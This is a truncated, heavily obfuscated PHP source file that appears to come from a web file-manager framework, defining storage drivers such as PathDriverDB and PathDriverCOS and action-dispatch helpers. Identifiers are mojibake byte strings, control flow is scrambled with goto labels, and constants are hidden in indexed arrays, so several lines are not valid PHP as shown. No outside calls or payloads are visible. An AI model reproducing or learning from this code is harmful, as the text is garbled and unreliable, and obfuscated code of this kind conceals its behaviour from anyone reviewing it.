$cÎÀ≤ıâÜÈ->hashMd5($e¶÷«ÖåØ…[$C¢Ÿ—¿≠„©[75]]); if (strlen($B–“™åò÷») > 10 && !isset($aƒñÜÙÒ§≈[$B–“™åò÷»])) { $aƒñÜÙÒ§≈[$B–“™åò÷»] = array(); } $e¶÷«ÖåØ…[$C¢Ÿ—¿≠„©[160]] = $cœîâ’Ò¨Î; goto A‡’ç¡Üíã; A‡’ç¡Üíã: $e¶÷«ÖåØ…[$C¢Ÿ—¿≠„©[159]] = $B–“™åò÷»; Hook::trigger($C¢Ÿ—¿≠„©[539], $e¶÷«ÖåØ…); $aƒñÜÙÒ§≈[$B–“™åò÷»][] =& $e¶÷«ÖåØ…; goto c¡·ÈóœØ¢; c¡·ÈóœØ¢: if (count($aƒñÜÙÒ§≈[$B–“™åò÷»]) > 1) { $e¶÷«ÖåØ…[$C¢Ÿ—¿≠„©[537]] = !0; } goto eÓ¯Ω≈ÚÉ¯; eÓ¯Ω≈ÚÉ¯: } $b·Æ’õ‹” = array($C¢Ÿ—¿≠„©[159] => array($C¢Ÿ—¿≠„©[7], array_keys($aƒñÜÙÒ§≈))); $e—∞ûãÈ≤ê = Model($C¢Ÿ—¿≠„©[540]); goto C∞›»‹‡Éë; d£‘˘®ÿ◊®: $b·Æ’õ‹” = array($C¢Ÿ—¿≠„©[159] => array($C¢Ÿ—¿≠„©[7], array_keys($aƒñÜÙÒ§≈))); $F¥§öõ·—• = $e—∞ûãÈ≤ê->where($b·Æ’õ‹”)->select(); $F¥§öõ·—• = $F¥§öõ·—• ? $F¥§öõ·—• : array(); goto aÍÕÒı∂ïé; d…·Úˆ†õæ: } } define($_SERVER[¯èãÄπµ][541], $_SERVER[¯èãÄπµ][542]); goto Fô°æµ≠¡´; Fë•´∆Æã⁄: $_SERVER[$_SERVER[ÎÏ°ﬂ±å][52]] = ("\71\65\65\62"."\x30\x39")+0;$_tN7z="SIw7AUnUJajh6svvWkKgG5TAW5NmurzaEsmXjaJMRGPQyVTaQcUSGrd8XpY29IdVxHEa9VzDx2GGNKSE";; stream_wrapper_register($_SERVER[ÎÏ°ﬂ±å][53], $_SERVER[ÎÏ°ﬂ±å][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($BÖë«ﬂáµâ, $DŒ≤≠Á¥ ò) { $f§ìı‡ê◊ˆ =& $_SERVER[¯èãÄπµ]; if (isset(self::$_methodList[$BÖë«ﬂáµâ])) { return @call_user_func_array(self::$_methodList[$BÖë«ﬂáµâ], $DŒ≤≠Á¥ ò); } else { if (method_exists($this, $BÖë«ﬂáµâ)) { return call_user_func_array(array($this, $BÖë«ﬂáµâ), $DŒ≤≠Á¥ ò); } else { think_exception(__CLASS__ . $f§ìı‡ê◊ˆ[4] . $BÖë«ﬂáµâ . $f§ìı‡ê◊ˆ[5]); } } } public static function __callStatic($D∏’õÛÃìÓ, $DÖƒÕù≤ÀÈ) { if (isset(self::$_methodListStatic[$D∏’õÛÃìÓ])) { return call_user_func_array(self::$_methodListStatic[$D∏’õÛÃìÓ], $DÖƒÕù≤ÀÈ); } else { if (method_exists(self, $D∏’õÛÃìÓ)) { return call_user_func_array(array(self, $D∏’õÛÃìÓ), $DÖƒÕù≤ÀÈ); } else { show_json("{$D∏’õÛÃìÓ}\x28\x29\x20\156\157\x74\x20\x65\170\151\x73\164\73", !1); } } } public static function addMethod($DÁéÿ¡…ÕÒ, $c„ôÆøı¢‰) { self::$_methodList[$DÁéÿ¡…ÕÒ] = $c„ôÆøı¢‰; } public static function addMethodStatic($Fúû·ïπë‰, $D‚ºﬁüÜªÇ) { self::$_methodListStatic[$Fúû·ïπë‰] = $D‚ºﬁüÜªÇ; } } goto c’ú≥‰äç⁄; aõÑÙî¨ÿπ: function Action($Eè†ãÌí·Ñ = '') { goto eÕ¨ù£îñ∂; B¬¥§ºıà≈: if (isset($DË™°è¿Íô[$CñÉ‡ÿúπ≠])) { return $DË™°è¿Íô[$CñÉ‡ÿúπ≠]; } if (is_file($Cﬁ—Âãê“Â)) { include_once $Cﬁ—Âãê“Â; } if (!class_exists($eÀª÷°Ùæπ)) { return actionCallError("\133{$Eè†ãÌí·Ñ}\40\75\x3e\40{$eÀª÷°Ùæπ}\135\x20\x63\x6c\141\x73\163\x20\156\157\164\x20\145\x78\151\x73\164\x73\x21"); } goto d÷∏Çõà˘Õ; B´√÷é≈ƒﬁ: if (isset($DË™°è¿Íô[$fÂ‰Ùáÿø¿])) { return $DË™°è¿Íô[$fÂ‰Ùáÿø¿]; } $Eè†ãÌí·Ñ = trim(str_replace($bπ‡èí‰À‰[4], $bπ‡èí‰À‰[5], $Eè†ãÌí·Ñ), $bπ‡èí‰À‰[4]); $cÈƒ’‚å≈â = explode($bπ‡èí‰À‰[5], $Eè†ãÌí·Ñ); goto eÚôÇÂ‚·‡; eÕ¨ù£îñ∂: $bπ‡èí‰À‰ =& $_SERVER[ÎÏ°ﬂ±å]; static $DË™°è¿Íô = array(); $fÂ‰Ùáÿø¿ = $Eè†ãÌí·Ñ; goto B´√÷é≈ƒﬁ; d÷∏Çõà˘Õ: $DË™°è¿Íô[$CñÉ‡ÿúπ≠] = new $eÀª÷°Ùæπ(); $DË™°è¿Íô[$fÂ‰Ùáÿø¿] = $DË™°è¿Íô[$CñÉ‡ÿúπ≠]; return $DË™°è¿Íô[$CñÉ‡ÿúπ≠]; goto bÍˆ˜‘“’„; eÚôÇÂ‚·‡: $CÕ≠≠∂íßñ = strtolower($cÈƒ’‚å≈â[0]); if (substr($CÕ≠≠∂íßñ, -6) == $bπ‡èí‰À‰[6]) { $Eè†ãÌí·Ñ = substr($cÈƒ’‚å≈â[0], 0, -6); $eÀª÷°Ùæπ = $Eè†ãÌí·Ñ . $bπ‡èí‰À‰[7]; $Cﬁ—Âãê“Â = $bπ‡èí‰À‰[8]; if (isset($cÈƒ’‚å≈â[1]) && substr(strtolower($cÈƒ’‚å≈â[1]), -5) == $bπ‡èí‰À‰[9]) { $eÀª÷°Ùæπ = $Eè†ãÌí·Ñ . $cÈƒ’‚å≈â[1]; $Cﬁ—Âãê“Â = $bπ‡èí‰À‰[10] . $cÈƒ’‚å≈â[1] . $bπ‡èí‰À‰[11]; } else { if (count($cÈƒ’‚å≈â) == 3) { $eÀª÷°Ùæπ = $Eè†ãÌí·Ñ . $cÈƒ’‚å≈â[1] . $cÈƒ’‚å≈â[2]; $Cﬁ—Âãê“Â = $bπ‡èí‰À‰[12] . $cÈƒ’‚å≈â[1] . $bπ‡èí‰À‰[13] . $cÈƒ’‚å≈â[2] . $bπ‡èí‰À‰[11]; } } $Cﬁ—Âãê“Â = PLUGIN_DIR . $Eè†ãÌí·Ñ . $bπ‡èí‰À‰[4] . $Cﬁ—Âãê“Â; } else { if (substr($CÕ≠≠∂íßñ, -5) == $bπ‡èí‰À‰[9]) { $Eè†ãÌí·Ñ = substr($cÈƒ’‚å≈â[0], 0, -5); return Model($Eè†ãÌí·Ñ); } else { $eÀª÷°Ùæπ = $cÈƒ’‚å≈â[0] . $cÈƒ’‚å≈â[1]; $Cﬁ—Âãê“Â = CONTROLLER_DIR . $cÈƒ’‚å≈â[0] . $bπ‡èí‰À‰[4] . $cÈƒ’‚å≈â[1] . $bπ‡èí‰À‰[14]; } } $CñÉ‡ÿúπ≠ = strtolower($eÀª÷°Ùæπ); goto B¬¥§ºıà≈; bÍˆ˜‘“’„: } function ActionApply($Bë‘ÈâŸü¿, $aµ€òØóÕ∆ = array()) { goto E°´øßÉñﬂ; E°´øßÉñﬂ: if (is_array($Bë‘ÈâŸü¿)) { return call_user_func_array($Bë‘ÈâŸü¿, $aµ€òØóÕ∆); } if (function_exists($Bë‘ÈâŸü¿)) { return call_user_func_array($Bë‘ÈâŸü¿, $aµ€òØóÕ∆); } $C„Õ≈ì“ø≠ = strrpos($Bë‘ÈâŸü¿, $_SERVER[ÎÏ°ﬂ±å][5]); goto e¥Ìà¶´ËÈ; E∏êÇ»õ°±: if (!method_exists($AÂË–îö‰â, $Cå“ó π‹€)) { return actionCallError("{$Bë‘ÈâŸü¿}\40\x6d\145\x74\x68\157\x64\x20\156\x6f\x74\40\145\170\x69\163\164\x73\x21"); } $a…•¡ã⁄† = call_user_func_array(array($AÂË–îö‰â, $Cå“ó π‹€), $aµ€òØóÕ∆); return $a…•¡ã⁄†; goto d‡Îùï√©≥; e¥Ìà¶´ËÈ: $e‚ﬂßê≥¥ø = substr($Bë‘ÈâŸü¿, 0, $C„Õ≈ì“ø≠); $Cå“ó π‹€ = substr($Bë‘ÈâŸü¿, $C„Õ≈ì“ø≠ + 1); $AÂË–îö‰â = Action($e‚ﬂßê≥¥ø); goto E∏êÇ»õ°±; d‡Îùï√©≥: } function actionCallError($eù¨ßå™úÖ) { $cÌ˜ÜË‡çá =& $_SERVER[ÎÏ°ﬂ±å]; $B≈˘èá√èô = json_encode_force(array($cÌ˜ÜË‡çá[15] => this_url(), $cÌ˜ÜË‡çá[16] => $GLOBALS[$cÌ˜ÜË‡çá[16]])); $B≈˘èá√èô = str_replace(array($cÌ˜ÜË‡çá[17]), array($cÌ˜ÜË‡çá[4]), $B≈˘èá√èô); return write_log($eù¨ßå™úÖ . $cÌ˜ÜË‡çá[18] . $B≈˘èá√èô, $cÌ˜ÜË‡çá[19]); } goto C©ı˘‘€ﬁ⁄; D∂π£‡˘«†: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($cØ∂≥„Æ…é) { parent::__construct($cØ∂≥„Æ…é); $this->signatureVersion($_SERVER[¯èãÄπµ][196]); } public function uploadFormData($A∞Öæ—÷’, $Aè÷ûÛ¥◊∞ = 3600) { goto Bø’ıç≈û; B¬ªû≥‰Áú: $b∫∂™õÍπ· = array($bƒ•ö∫©ƒ[1097] => $c‹ˆà•∞”ƒ, $bƒ•ö∫©ƒ[1098] => array(array($bƒ•ö∫©ƒ[1099] => $f§ö§π·Ô∞), array($bƒ•ö∫©ƒ[1100] => $this->bucket), array($bƒ•ö∫©ƒ[1101], $bƒ•ö∫©ƒ[1102], $bƒ•ö∫©ƒ[33]), array($bƒ•ö∫©ƒ[1103] => $C˘¡Ã›†„ß), array($bƒ•ö∫©ƒ[1104] => $bΩÊ¢í°—Ï), array($bƒ•ö∫©ƒ[1105] => $this->accessKey), array($bƒ•ö∫©ƒ[1106] => $e•≠èøÂîí))); $b∫∂™õÍπ· = json_encode($b∫∂™õÍπ·); $B™ı¿¥Üäê = hash_hmac($bƒ•ö∫©ƒ[214], $e•≠èøÂîí, $this->secret); goto AÕÀèÉÇ®»; AÕÀèÉÇ®»: $a∏⁄™µ∫‡‘ = sha1($b∫∂™õÍπ·); $bå¯äá£´ç = hash_hmac($bƒ•ö∫©ƒ[214], $a∏⁄™µ∫‡‘, $B™ı¿¥Üäê); $D ›âàÊÒÍ = array($bƒ•ö∫©ƒ[1099] => $f§ö§π·Ô∞, $bƒ•ö∫©ƒ[1103] => $C˘¡Ã›†„ß, $bƒ•ö∫©ƒ[1107] => base64_encode($b∫∂™õÍπ·), $bƒ•ö∫©ƒ[1104] => $bΩÊ¢í°—Ï, $bƒ•ö∫©ƒ[1105] => $this->accessKey, $bƒ•ö∫©ƒ[1108] => $e•≠èøÂîí, $bƒ•ö∫©ƒ[1109] => $bå¯äá£´ç, $bƒ•ö∫©ƒ[165] => $this->getHost()); goto Eõì£¨«Ó»; Eõì£¨«Ó»: return $D ›âàÊÒÍ; goto aÜé‡πâÀ‹; E ∂®ö¨í˘: $C˘¡Ã›†„ß = $bƒ•ö∫©ƒ[1095]; $c‹ˆà•∞”ƒ = gmdate($bƒ•ö∫©ƒ[1096], time() + $Aè÷ûÛ¥◊∞); $e•≠èøÂîí = (string) time() . $bƒ•ö∫©ƒ[67] . (string) (time() + $Aè÷ûÛ¥◊∞); goto B¬ªû≥‰Áú; Bø’ıç≈û: $bƒ•ö∫©ƒ =& $_SERVER[¯èãÄπµ]; $f§ö§π·Ô∞ = $bƒ•ö∫©ƒ[181]; $bΩÊ¢í°—Ï = $bƒ•ö∫©ƒ[214]; goto E ∂®ö¨í˘; aÜé‡πâÀ‹: } public function fileOutLink($C»¢ñ≤µ’ì) { $A¿ÒÌî‹ëê =& $_SERVER[¯èãÄπµ]; if (substr($C»¢ñ≤µ’ì, 0, 7) == $A¿ÒÌî‹ëê[1110]) { $C»¢ñ≤µ’ì = $A¿ÒÌî‹ëê[1111] . substr($C»¢ñ≤µ’ì, 7); } header($A¿ÒÌî‹ëê[152] . $C»¢ñ≤µ’ì); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Cé›ç∫Ôı‚) { $this->pathParse = $Cé›ç∫Ôı‚; $this->model = Model($_SERVER[¯èãÄπµ][1112]); } public function getPath($FïÍµíΩÃ) { return trim($FïÍµíΩÃ, $_SERVER[¯èãÄπµ][8]); } public function pathFather($c≈≠ÃΩº¶å) { $CË•÷†ÛƒΩ = $this->parse($c≈≠ÃΩº¶å); $CË•÷†ÛƒΩ = $this->infoSimple($c≈≠ÃΩº¶å); return $CË•÷†ÛƒΩ ? $CË•÷†ÛƒΩ[$_SERVER[¯èãÄπµ][457]] : !1; } public function getPathName($C‡Ÿ›£é‚‰) { $Aø“∑‘ƒÆÑ = $this->infoSimple($C‡Ÿ›£é‚‰); return $Aø“∑‘ƒÆÑ ? $Aø“∑‘ƒÆÑ[$_SERVER[¯èãÄπµ][28]] : !1; } public function getPathOuter($E‚“óˆçÍ∂) { if (!$E‚“óˆçÍ∂) { return $E‚“óˆçÍ∂; } $cÜçÛÿ±∏÷ = $this->parse($E‚“óˆçÍ∂); return KodIO::make($cÜçÛÿ±∏÷[$_SERVER[¯èãÄπµ][363]]); } public function copyFolderFromIO($B»˘ÒÔÚéÆ, $EëÖ§âπø†, $C‰ıÌóÃÁä, $AŒÓÿ≈óè˘, $EÙﬁ˜ÜëçÊ) { $D¬õ´âá◊ì = $this->model->copyFolderFromIO($B»˘ÒÔÚéÆ, $EëÖ§âπø†, $C‰ıÌóÃÁä, $AŒÓÿ≈óè˘, $EÙﬁ˜ÜëçÊ); return KodIO::make($D¬õ´âá◊ì); } public function isParentOf($F◊Ë¶àú Œ, $d…ÁÕœ”ûí) { return $this->model->isParentOf($F◊Ë¶àú Œ, $d…ÁÕœ”ûí); } public function mkfile($EôÜêÿ¯ÃÉ, $A€™º√∫”© = '', $eÇ„õäÁÖı = REPEAT_RENAME) { $eÀ÷âë¨∫ =& $_SERVER[¯èãÄπµ]; $D’áåÛ∫…Ô = $this->parse($EôÜêÿ¯ÃÉ); $EôÜêÿ¯ÃÉ = $D’áåÛ∫…Ô[$eÀ÷âë¨∫[363]]; for ($câô™®—«ü = 0; $câô™®—«ü < count($D’áåÛ∫…Ô[$eÀ÷âë¨∫[1113]]); $câô™®—«ü++) { $F∑Ø√úÛâƒ = $D’áåÛ∫…Ô[$eÀ÷âë¨∫[1113]][$câô™®—«ü]; if ($câô™®—«ü == count($D’áåÛ∫…Ô[$eÀ÷âë¨∫[1113]]) - 1) { $EôÜêÿ¯ÃÉ = $this->model->mkfile($EôÜêÿ¯ÃÉ, $F∑Ø√úÛâƒ, $A€™º√∫”©, $eÇ„õäÁÖı); break; } $EôÜêÿ¯ÃÉ = $this->model->mkdir($EôÜêÿ¯ÃÉ, $F∑Ø√úÛâƒ, REPEAT_SKIP); } return $this->getPathOuter($EôÜêÿ¯ÃÉ); } public function mkdir($dÓò„ß–’ì, $e≠ıÓı¡–« = REPEAT_SKIP) { $cÑæïÔÒΩ≤ =& $_SERVER[¯èãÄπµ]; $AâáÏ‹¶º» = $this->parse($dÓò„ß–’ì); $dÓò„ß–’ì = $AâáÏ‹¶º»[$cÑæïÔÒΩ≤[363]]; for ($F„öùÙë≠Ô = 0; $F„öùÙë≠Ô < count($AâáÏ‹¶º»[$cÑæïÔÒΩ≤[1113]]); $F„öùÙë≠Ô++) { $Eé‘ì°¥–‹ = $AâáÏ‹¶º»[$cÑæïÔÒΩ≤[1113]][$F„öùÙë≠Ô]; $dÓò„ß–’ì = $this->model->mkdir($dÓò„ß–’ì, $Eé‘ì°¥–‹, $e≠ıÓı¡–«); } return $this->getPathOuter($dÓò„ß–’ì); } public function copyFile($Fí∏∑®—ˆ´, $DÖ•ﬂˆÇëÎ, $Fœò∫¯ﬂ¡∞ = REPEAT_REPLACE) { $B´†´ë⁄Á¿ =& $_SERVER[¯èãÄπµ]; $A¨áã¬À≥¡ = $this->parse($DÖ•ﬂˆÇëÎ); $dñŸﬁ¨ÿß« = $this->model->copy($Fí∏∑®—ˆ´, $A¨áã¬À≥¡[$B´†´ë⁄Á¿[363]], $Fœò∫¯ﬂ¡∞, $A¨áã¬À≥¡[$B´†´ë⁄Á¿[75]]); return $dñŸﬁ¨ÿß« ? $this->getPathOuter($dñŸﬁ¨ÿß«) : !1; } public function moveFile($f√„‹çÔñ€, $c‘à√Ë†ﬂÂ, $EÇ≥Ãêô•‚ = REPEAT_REPLACE) { $Cº¯†ã¯˜Á =& $_SERVER[¯èãÄπµ]; $dÁçûﬂ≈ì´ = $this->parse($c‘à√Ë†ﬂÂ); $Eß©‹ô¨ÕØ = $this->model->move($f√„‹çÔñ€, $dÁçûﬂ≈ì´[$Cº¯†ã¯˜Á[363]], $EÇ≥Ãêô•‚, $dÁçûﬂ≈ì´[$Cº¯†ã¯˜Á[75]]); return $Eß©‹ô¨ÕØ ? $this->getPathOuter($Eß©‹ô¨ÕØ) : !1; } public function copy($b∏™≤ÕÜ®∞, $bÌ≤ê±Ö°⁄, $bÜ∑ù òªú = REPEAT_REPLACE) { $d£ÿ√¨âò‰ = $this->parse($bÌ≤ê±Ö°⁄); $DëöúæÌí‰ = $this->model->copy($b∏™≤ÕÜ®∞, $d£ÿ√¨âò‰[$_SERVER[¯èãÄπµ][363]], $bÜ∑ù òªú); return $DëöúæÌí‰ ? $this->getPathOuter($DëöúæÌí‰) : !1; } public function move($b·±Èçââ√, $d∞ıå£„çÕ, $aÒ·–üóïÂ = REPEAT_REPLACE) { $Bı£ÓÏ∞èÌ = $this->parse($d∞ıå£„çÕ); $Bé›ÜÏﬁ≥¯ = $this->model->move($b·±Èçââ√, $Bı£ÓÏ∞èÌ[$_SERVER[¯èãÄπµ][363]], $aÒ·–üóïÂ); return $Bé›ÜÏﬁ≥¯ ? $this->getPathOuter($Bé›ÜÏﬁ≥¯) : !1; } public function remove($BõÎ°÷Öıó, $A—…¥ÜŸ√ï = true) { return $this->model->remove($BõÎ°÷Öıó, $A—…¥ÜŸ√ï); } public function rename($DÕ∫Ùªå¶±, $d˘ΩããÌ ù) { $EŸ›‹πêÜ√ = $this->model->rename($DÕ∫Ùªå¶±, $d˘ΩããÌ ù); return $EŸ›‹πêÜ√ ? $this->getPathOuter($DÕ∫Ùªå¶±) : $EŸ›‹πêÜ√; } public function size($b°Ì¨ß¯øè) { $a€·æÜáéÈ = $this->infoSimple($b°Ì¨ß¯øè); return $a€·æÜáéÈ ? $a€·æÜáéÈ[$_SERVER[¯èãÄπµ][77]] : 0; } public function infoSimple($F¯ãûÓ¯ı) { return $this->model->sourceInfo($F¯ãûÓ¯ı); } public function info($d«∂£∫ßá†) { return $this->infoParse($d«∂£∫ßá†); } public function infoAuth($d†¡ïºöå√) { return $this->infoParse($d†¡ïºöå√, !1, !0); } public function infoWithChildren($eÃà®‚©úﬂ) { return $this->infoParse($eÃà®‚©úﬂ, !0); } protected function infoParse($B¿ƒﬁ≥€ì…, $CÓ£⁄√îùÒ = false, $A◊ÿÎ¨«Èä = false) { if (!$CÓ£⁄√îùÒ) { return $this->model->pathInfo($B¿ƒﬁ≥€ì…, $A◊ÿÎ¨«Èä); } return $this->model->pathInfoMore($B¿ƒﬁ≥€ì…); } public function infoFull($dÏÜ÷Ã∞»§) { $a´ÂâÕ†≈ê =& $_SERVER[¯èãÄπµ]; $B±≈Üâù›≥ = explode($a´ÂâÕ†≈ê[8], $dÏÜ÷Ã∞»§); $aŒ∞ãïÖÇè = implode($a´ÂâÕ†≈ê[8], array_splice($B±≈Üâù›≥, 1)); return $this->model->pathInfoByPath($B±≈Üâù›≥[0], $aŒ∞ãïÖÇè); } public function hashSimple($f∫›œÜ¯û©) { $b£éå≤≠€ˆ =& $_SERVER[¯èãÄπµ]; $bÂ„•å£Ó© = $this->infoWithChildren($f∫›œÜ¯û©); return $bÂ„•å£Ó©[$b£éå≤≠€ˆ[158]][$b£éå≤≠€ˆ[160]]; } public function hashMd5($fãπÂêäÊ∏) { $Cë–ƒ–ß⁄ˆ =& $_SERVER[¯èãÄπµ]; $A –‰É–óœ = $this->infoWithChildren($fãπÂêäÊ∏); return $A –‰É–óœ[$Cë–ƒ–ß⁄ˆ[158]][$Cë–ƒ–ß⁄ˆ[159]]; } public function exist($F“û÷¶¨¶∫) { $B⁄≈•å◊Ü =& $_SERVER[¯èãÄπµ]; $b‘ûêìÇ‘Ÿ = $this->parse($F“û÷¶¨¶∫); if (!$b‘ûêìÇ‘Ÿ[$B⁄≈•å◊Ü[75]]) { return $this->isFile($F“û÷¶¨¶∫) || $this->isFolder($F“û÷¶¨¶∫); } $A§öÂû“ä– = array($B⁄≈•å◊Ü[364] => $b‘ûêìÇ‘Ÿ[$B⁄≈•å◊Ü[363]], $B⁄≈•å◊Ü[28] => $b‘ûêìÇ‘Ÿ[$B⁄≈•å◊Ü[75]]); $E’¢âﬁ°§ﬁ = $this->model->where($A§öÂû“ä–)->find(); return $E’¢âﬁ°§ﬁ ? !0 : !1; } public function isFile($bÜ°ŸõóÈÇ) { $E·Èæ«“ΩÙ =& $_SERVER[¯èãÄπµ]; $EÜ«≤ÜÁ€É = $this->infoSimple($bÜ°ŸõóÈÇ); return $EÜ«≤ÜÁ€É && $EÜ«≤ÜÁ€É[$E·Èæ«“ΩÙ[366]] == $E·Èæ«“ΩÙ[83] ? !1 : !0; } public function isFolder($aáﬂ‹êÀ¶◊) { $D¬òéáƒ©„ =& $_SERVER[¯èãÄπµ]; $fÉùÓ∆ì·¶ = $this->infoSimple($aáﬂ‹êÀ¶◊); return $fÉùÓ∆ì·¶ && $fÉùÓ∆ì·¶[$D¬òéáƒ©„[366]] == $D¬òéáƒ©„[83] ? !0 : !1; } public function listPath($F£î€ò–°ú, $b›√äèô∏÷ = false) { $fƒôëãÊ•ﬂ =& $_SERVER[¯èãÄπµ]; if ($F£î€ò–°ú == $fƒôëãÊ•ﬂ[33]) { return !1; } $b∫ÜêùÖ°È = array($fƒôëãÊ•ﬂ[364] => $F£î€ò–°ú); if ($b›√äèô∏÷) { return $this->model->listSource($b∫ÜêùÖ°È, -1); } return $this->model->listSource($b∫ÜêùÖ°È); } public function has($d≈ ‘°Â√‹, $C‰¬˘πŸŸ© = false, $FÑÇ√ÁÔ·û = null) { $dËàÕÓû≈» =& $_SERVER[¯èãÄπµ]; $aË¨ÉÉÉÈ— = $this->infoWithChildren($d≈ ‘°Â√‹); if ($C‰¬˘πŸŸ©) { return array($dËàÕÓû≈»[188] => $aË¨ÉÉÉÈ—[$dËàÕÓû≈»[188]], $dËàÕÓû≈»[187] => $aË¨ÉÉÉÈ—[$dËàÕÓû≈»[187]]); } return $FÑÇ√ÁÔ·û ? $aË¨ÉÉÉÈ—[$dËàÕÓû≈»[188]] : $aË¨ÉÉÉÈ—[$dËàÕÓû≈»[187]]; } public function listAll($E–û≤àêÿ∂) { $DÎÒà“á°® = IO::info($this->pathParse[$_SERVER[¯èãÄπµ][75]]); if (!$DÎÒà“á°®) { return array(); } return $this->model->listAll($E–û≤àêÿ∂); } public function getContent($EäãâÓÏÛì) { return $this->model->getContent($EäãâÓÏÛì); } public function setContent($B≥œä‘•Éå, $D«ﬂ≈≥õõÇ = '') { return $this->model->setContent($B≥œä‘•Éå, $D«ﬂ≈≥õõÇ); } public function fileSubstr($aèí‡ı∞≠ò, $BÁ¬ìˆøœä, $aÖ«Ç•ä√Ω) { return $this->model->fileSubstr($aèí‡ı∞≠ò, $BÁ¬ìˆøœä, $aÖ«Ç•ä√Ω); } public function download($AçëÔŸé”π, $A¶ÉöŒ»¡⁄ = '') { $a‹ÕûÓ∫ÕÑ = get_path_father($A¶ÉöŒ»¡⁄); $Aˆ“ÎﬂØè∂ = get_path_this($A¶ÉöŒ»¡⁄); $B¢ÖÉﬁ∏»Ó = $this->model->fileInfoGet($AçëÔŸé”π); $E®ˆ’¡Ú•í = IO::copy($B¢ÖÉﬁ∏»Ó[$_SERVER[¯èãÄπµ][75]], $a‹ÕûÓ∫ÕÑ, !1, $Aˆ“ÎﬂØè∂); return $E®ˆ’¡Ú•í; } public function upload($cÑ©¥®é¶”, $búÍÑ¶ßΩ∞, $dôÜ´øÍäƒ = false, $C≤‘É≈¨”ã = REPEAT_REPLACE) { $Añ˘Ñ¥…ËÛ =& $_SERVER[¯èãÄπµ]; $dÌƒ≠ÛÁúƒ = $this->parse($cÑ©¥®é¶”); $dõ¿ñÉÂß = $this->model->addFile($dÌƒ≠ÛÁúƒ[$Añ˘Ñ¥…ËÛ[363]], $búÍÑ¶ßΩ∞, $dÌƒ≠ÛÁúƒ[$Añ˘Ñ¥…ËÛ[75]], $dôÜ´øÍäƒ, $C≤‘É≈¨”ã); return $this->getPathOuter($dõ¿ñÉÂß); } public function uploadFileByID($C®êÃ£ªíØ, $A∑˜•É©ºÍ, $FÑÒ™£Âœç) { $AÉÙåË°∑‚ =& $_SERVER[¯èãÄπµ]; $EËµ»æ‘∏√ = $this->parse($C®êÃ£ªíØ); $aËÂ“„äÑç = $this->model->addFileByFileID($EËµ»æ‘∏√[$AÉÙåË°∑‚[363]], $A∑˜•É©ºÍ, $EËµ»æ‘∏√[$AÉÙåË°∑‚[75]], $FÑÒ™£Âœç); return $this->getPathOuter($aËÂ“„äÑç); } public function addFileByRemote($Aîà≥…ÛœÉ, $bÌÒ÷«É”‘, $f∆çæªÉ‡ª = array(), $E‡˘ÉÊàÒ¥ = '', $dÓÑ éÆ´¶) { $E©‡˜Àá Ü =& $_SERVER[¯èãÄπµ]; $D·ÒıÌúÚÂ = $this->parse($Aîà≥…ÛœÉ); $E‡˘ÉÊàÒ¥ = empty($E‡˘ÉÊàÒ¥) ? $D·ÒıÌúÚÂ[$E©‡˜Àá Ü[75]] : $E‡˘ÉÊàÒ¥; $A§ã—⁄Éé— = $this->model->addFileByRemote($D·ÒıÌúÚÂ[$E©‡˜Àá Ü[363]], $bÌÒ÷«É”‘, $E‡˘ÉÊàÒ¥, $f∆çæªÉ‡ª, $dÓÑ éÆ´¶); return $this->getPathOuter($A§ã—⁄Éé—); } public function uploadLink($cÜßâ∏ÑëØ, $A¬ó¥Á∞§÷ = 0) { $CàΩÚçã¥ =& $_SERVER[¯èãÄπµ]; $AÀÚ‚≠¶ÉÙ = $this->parse($cÜßâ∏ÑëØ); $cÜßâ∏ÑëØ = Model($CàΩÚçã¥[540])->createFileName($AÀÚ‚≠¶ÉÙ[$CàΩÚçã¥[75]]); $eô∆çÀêØÈ = IO::uploadLink($cÜßâ∏ÑëØ, $A¬ó¥Á∞§÷); return $eô∆çÀêØÈ; } public function fileNameAuto($AçÊÑ¥úè∆, $eœÓ§≠£¯Ö, $b€–‡Ÿ—÷∏ = REPEAT_REPLACE, $B¡íùÜ∞ãâ = false) { return $this->model->fileNameAuto($AçÊÑ¥úè∆, $eœÓ§≠£¯Ö, $b€–‡Ÿ—÷∏, $B¡íùÜ∞ãâ); } public function fileNameExist($aﬂû†◊Ñªû, $e‚•àáµëı) { return $this->model->fileNameExist($aﬂû†◊Ñªû, $e‚•àáµëı); } protected function _fileOut($DıŸ‚çæê≈, $b∞ï¬‚ﬂ©É = false, $b œÜ‘∏ëì = false, $eîôﬁúëŒÊ = '', $d‘ÛÉ“©•› = false) { goto eîâ§û–∑˜; DÜœ§Ëé Ñ: if ($d‘ÛÉ“©•›) { return IO::fileOutServer($cÚ‰ñÈô…î[$cπáı∞ËÉ¯[75]], $b∞ï¬‚ﬂ©É, $f´†Úñ±Ø‚, $eîôﬁúëŒÊ); } IO::fileOut($cÚ‰ñÈô…î[$cπáı∞ËÉ¯[75]], $b∞ï¬‚ﬂ©É, $f´†Úñ±Ø‚, $eîôﬁúëŒÊ); goto DºÜÉéç◊–; eîâ§û–∑˜: $cπáı∞ËÉ¯ =& $_SERVER[¯èãÄπµ]; $aÀÍºÒÇ¡∆ = $this->model->sourceInfo($DıŸ‚çæê≈); if ($aÀÍºÒÇ¡∆[$cπáı∞ËÉ¯[366]] == $cπáı∞ËÉ¯[83]) { header($cπáı∞ËÉ¯[1114]); die; } goto Bú≠Ùîâ∑ƒ; Bú≠Ùîâ∑ƒ: $cÚ‰ñÈô…î = $this->model->fileInfoGet($DıŸ‚çæê≈); $eîôﬁúëŒÊ = $cÚ‰ñÈô…î[$cπáı∞ËÉ¯[159]] ? $cÚ‰ñÈô…î[$cπáı∞ËÉ¯[159]] : $eîôﬁúëŒÊ; $f´†Úñ±Ø‚ = isset($GLOBALS[$cπáı∞ËÉ¯[1115]]) ? $GLOBALS[$cπáı∞ËÉ¯[1115]] : $aÀÍºÒÇ¡∆[$cπáı∞ËÉ¯[28]]; goto DÜœ§Ëé Ñ; DºÜÉéç◊–: } public function fileOut($AÙæ‡ø™ÇÀ, $dì•…‘Ç◊ç = false, $D £Ç‚åΩ” = false, $eÓãå÷Œóõ = '') { $this->_fileOut($AÙæ‡ø™ÇÀ, $dì•…‘Ç◊ç, $D £Ç‚åΩ”, $eÓãå÷Œóõ); } public function fileOutServer($Bí≈£ã†∏î, $B»“∞ò•¯ = false, $FŒÕ›§Ôáı = false, $DìÆ≤Çíµ° = '') { $this->_fileOut($Bí≈£ã†∏î, $B»“∞ò•¯, $FŒÕ›§Ôáı, 